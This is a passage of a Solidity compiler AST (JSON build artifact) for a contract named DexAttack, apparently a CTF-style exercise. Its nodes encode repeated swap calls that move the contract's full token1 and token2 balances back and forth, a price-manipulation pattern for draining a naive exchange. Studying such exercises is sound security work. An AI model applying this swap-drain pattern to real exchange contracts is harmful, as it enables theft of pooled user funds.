												"expression": {
													"arguments": [
														{
															"id": 970,
															"name": "token1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 727,
															"src": "1627:6:4",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 971,
															"name": "token2",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 729,
															"src": "1635:6:4",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"arguments": [
																{
																	"arguments": [
																		{
																			"id": 978,
																			"name": "this",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 4294967268,
																			"src": "1676:4:4",
																			"typeDescriptions": {
																				"typeIdentifier": "t_contract$_DexAttack_$1114",
																				"typeString": "contract DexAttack"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_contract$_DexAttack_$1114",
																				"typeString": "contract DexAttack"
																			}
																		],
																		"id": 977,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "1668:7:4",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_address_$",
																			"typeString": "type(address)"
																		},
																		"typeName": {
																			"id": 976,
																			"name": "address",
																			"nodeType": "ElementaryTypeName",
																			"src": "1668:7:4",
																			"typeDescriptions": {}
																		}
																	},
																	"id": 979,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"nameLocations": [],
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "1668:13:4",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"expression": {
																	"arguments": [
																		{
																			"id": 973,
																			"name": "token1",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 727,
																			"src": "1650:6:4",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		],
																		"id": 972,
																		"name": "IERC20",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 664,
																		"src": "1643:6:4",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_contract$_IERC20_$664_$",
																			"typeString": "type(contract IERC20)"
																		}
																	},
																	"id": 974,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"nameLocations": [],
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "1643:14:4",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_IERC20_$664",
																		"typeString": "contract IERC20"
																	}
																},
																"id": 975,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberLocation": "1658:9:4",
																"memberName": "balanceOf",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 621,
																"src": "1643:24:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
																	"typeString": "function (address) view external returns (uint256)"
																}
															},
															"id": 980,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1643:39:4",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"arguments": [
																{
																	"id": 967,
																	"name": "dex",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 733,
																	"src": "1617:3:4",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 966,
																"name": "IDex",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 725,
																"src": "1612:4:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IDex_$725_$",
																	"typeString": "type(contract IDex)"
																}
															},
															"id": 968,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1612:9:4",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IDex_$725",
																"typeString": "contract IDex"
															}
														},
														"id": 969,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "1622:4:4",
														"memberName": "swap",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 724,
														"src": "1612:14:4",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256) external"
														}
													},
													"id": 981,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1612:71:4",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 982,
												"nodeType": "ExpressionStatement",
												"src": "1612:71:4"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 987,
															"name": "token2",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 729,
															"src": "1710:6:4",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 988,
															"name": "token1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 727,
															"src": "1718:6:4",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"arguments": [
																{
																	"arguments": [
																		{
																			"id": 995,
																			"name": "this",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 4294967268,
																			"src": "1759:4:4",
																			"typeDescriptions": {
																				"typeIdentifier": "t_contract$_DexAttack_$1114",
																				"typeString": "contract DexAttack"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_contract$_DexAttack_$1114",
																				"typeString": "contract DexAttack"
																			}
																		],
																		"id": 994,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "1751:7:4",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_address_$",
																			"typeString": "type(address)"
																		},
																		"typeName": {
																			"id": 993,
																			"name": "address",
																			"nodeType": "ElementaryTypeName",
																			"src": "1751:7:4",
																			"typeDescriptions": {}
																		}
																	},
																	"id": 996,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"nameLocations": [],
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "1751:13:4",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"expression": {
																	"arguments": [
																		{
																			"id": 990,
																			"name": "token2",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 729,
																			"src": "1733:6:4",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		],
																		"id": 989,
																		"name": "IERC20",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 664,
																		"src": "1726:6:4",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_contract$_IERC20_$664_$",
																			"typeString": "type(contract IERC20)"
																		}
																	},
																	"id": 991,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"nameLocations": [],
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "1726:14:4",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_IERC20_$664",
																		"typeString": "contract IERC20"
																	}
																},
																"id": 992,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberLocation": "1741:9:4",
																"memberName": "balanceOf",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 621,
																"src": "1726:24:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
																	"typeString": "function (address) view external returns (uint256)"
																}
															},
															"id": 997,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1726:39:4",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"arguments": [
																{
																	"id": 984,
																	"name": "dex",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 733,
																	"src": "1700:3:4",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 983,
																"name": "IDex",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 725,
																"src": "1695:4:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IDex_$725_$",
																	"typeString": "type(contract IDex)"
																}
															},
															"id": 985,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1695:9:4",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IDex_$725",
																"typeString": "contract IDex"
															}
														},
														"id": 986,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "1705:4:4",
														"memberName": "swap",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 724,
														"src": "1695:14:4",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256) external"
														}
													},
													"id": 998,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1695:71:4",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 999,
												"nodeType": "ExpressionStatement",
												"src": "1695:71:4"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 1004,
															"name": "token1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 727,
															"src": "1791:6:4",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 1005,
															"name": "token2",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 729,
															"src": "1799:6:4",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"arguments": [
																{
																	"arguments": [
																		{
																			"id": 1012,
																			"name": "this",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 4294967268,
																			"src": "1840:4:4",
																			"typeDescriptions": {
																				"typeIdentifier": "t_contract$_DexAttack_$1114",
																				"typeString": "contract DexAttack"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_contract$_DexAttack_$1114",
																				"typeString": "contract DexAttack"
																			}
																		],
																		"id": 1011,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "1832:7:4",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_address_$",
																			"typeString": "type(address)"
																		},
																		"typeName": {
																			"id": 1010,
																			"name": "address",
																			"nodeType": "ElementaryTypeName",
																			"src": "1832:7:4",
																			"typeDescriptions": {}
																		}
																	},
																	"id": 1013,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"nameLocations": [],
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "1832:13:4",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"expression": {
																	"arguments": [
																		{
																			"id": 1007,
																			"name": "token1",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 727,
																			"src": "1814:6:4",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		],
																		"id": 1006,
																		"name": "IERC20",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 664,
																		"src": "1807:6:4",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_contract$_IERC20_$664_$",
																			"typeString": "type(contract IERC20)"
																		}
																	},
																	"id": 1008,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"nameLocations": [],
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "1807:14:4",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_IERC20_$664",
																		"typeString": "contract IERC20"
																	}
																},
																"id": 1009,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberLocation": "1822:9:4",
																"memberName": "balanceOf",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 621,
																"src": "1807:24:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
																	"typeString": "function (address) view external returns (uint256)"
																}
															},
															"id": 1014,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1807:39:4",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"arguments": [
																{
																	"id": 1001,
																	"name": "dex",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 733,
																	"src": "1781:3:4",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 1000,
																"name": "IDex",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 725,
																"src": "1776:4:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IDex_$725_$",
																	"typeString": "type(contract IDex)"
																}
															},
															"id": 1002,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1776:9:4",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IDex_$725",
																"typeString": "contract IDex"
															}
														},
														"id": 1003,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "1786:4:4",
														"memberName": "swap",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 724,
														"src": "1776:14:4",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256) external"
														}
													},
													"id": 1015,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1776:71:4",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1016,
												"nodeType": "ExpressionStatement",
												"src": "1776:71:4"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 1021,
															"name": "token2",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 729,
															"src": "1872:6:4",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 1022,
															"name": "token1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 727,
															"src": "1880:6:4",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"arguments": [
																{
																	"arguments": [
																		{
																			"id": 1029,
																			"name": "this",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 4294967268,
																			"src": "1921:4:4",
																			"typeDescriptions": {
																				"typeIdentifier": "t_contract$_DexAttack_$1114",
																				"typeString": "contract DexAttack"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_contract$_DexAttack_$1114",
																				"typeString": "contract DexAttack"
																			}
																		],
																		"id": 1028,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "1913:7:4",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_address_$",
																			"typeString": "type(address)"
																		},
																		"typeName": {
																			"id": 1027,
																			"name": "address",
																			"nodeType": "ElementaryTypeName",
																			"src": "1913:7:4",
																			"typeDescriptions": {}
																		}
																	},
																	"id": 1030,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"nameLocations": [],
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "1913:13:4",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"expression": {
																	"arguments": [
																		{
																			"id": 1024,
																			"name": "token2",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 729,
																			"src": "1895:6:4",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		],
																		"id": 1023,
																		"name": "IERC20",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 664,
																		"src": "1888:6:4",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_contract$_IERC20_$664_$",
																			"typeString": "type(contract IERC20)"
																		}
																	},
																	"id": 1025,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"nameLocations": [],
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "1888:14:4",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_IERC20_$664",
																		"typeString": "contract IERC20"
																	}
																},
																"id": 1026,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberLocation": "1903:9:4",
																"memberName": "balanceOf",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 621,
																"src": "1888:24:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
																	"typeString": "function (address) view external returns (uint256)"
																}
															},
															"id": 1031,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1888:39:4",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"arguments": [
																{
																	"id": 1018,
																	"name": "dex",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 733,
																	"src": "1862:3:4",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 1017,
																"name": "IDex",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 725,
																"src": "1857:4:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IDex_$725_$",
																	"typeString": "type(contract IDex)"
																}
															},
															"id": 1019,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1857:9:4",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IDex_$725",
																"typeString": "contract IDex"
															}
														},
														"id": 1020,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "1867:4:4",
														"memberName": "swap",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 724,
														"src": "1857:14:4",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256) external"
														}
													},
													"id": 1032,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1857:71:4",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1033,
												"nodeType": "ExpressionStatement",
												"src": "1857:71:4"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 1038,
															"name": "token1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 727,
															"src": "1953:6:4",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 1039,
															"name": "token2",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 729,
															"src": "1961:6:4",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"arguments": [
																{
																	"arguments": [
																		{
																			"id": 1046,
																			"name": "this",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 4294967268,
																			"src": "2002:4:4",
																			"typeDescriptions": {
																				"typeIdentifier": "t_contract$_DexAttack_$1114",
																				"typeString": "contract DexAttack"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_contract$_DexAttack_$1114",
																				"typeString": "contract DexAttack"
																			}
																		],
																		"id": 1045,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "1994:7:4",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_address_$",
																			"typeString": "type(address)"
																		},
																		"typeName": {
																			"id": 1044,
																			"name": "address",
																			"nodeType": "ElementaryTypeName",
																			"src": "1994:7:4",
																			"typeDescriptions": {}
																		}
																	},
																	"id": 1047,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"nameLocations": [],
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "1994:13:4",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"expression": {
																	"arguments": [
																		{
																			"id": 1041,
																			"name": "token1",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 727,
																			"src": "1976:6:4",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		],
																		"id": 1040,
																		"name": "IERC20",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 664,
																		"src": "1969:6:4",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_contract$_IERC20_$664_$",
																			"typeString": "type(contract IERC20)"
																		}
																	},
																	"id": 1042,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"nameLocations": [],
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "1969:14:4",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_IERC20_$664",
																		"typeString": "contract IERC20"
																	}
																},
																"id": 1043,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberLocation": "1984:9:4",
																"memberName": "balanceOf",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 621,
																"src": "1969:24:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
																	"typeString": "function (address) view external returns (uint256)"
																}
															},
															"id": 1048,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1969:39:4",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"arguments": [
																{
																	"id": 1035,
																	"name": "dex",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 733,
																	"src": "1943:3:4",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 1034,
																"name": "IDex",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 725,
																"src": "1938:4:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IDex_$725_$",
																	"typeString": "type(contract IDex)"
																}
															},
															"id": 1036,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1938:9:4",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IDex_$725",
																"typeString": "contract IDex"
															}
														},
														"id": 1037,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "1948:4:4",
														"memberName": "swap",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 724,
														"src": "1938:14:4",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256) external"
														}
													},
													"id": 1049,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1938:71:4",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1050,
												"nodeType": "ExpressionStatement",
												"src": "1938:71:4"
											},
											{
